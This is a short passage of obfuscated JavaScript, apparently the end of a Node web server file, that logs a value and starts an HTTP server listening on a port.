_0x30dd4d=_0x4c05cd;console[_0x30dd4d(0x277)](_0x30dd4d(0x26f),_0x598686);}),app[_0x4c05cd(0x27f)](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
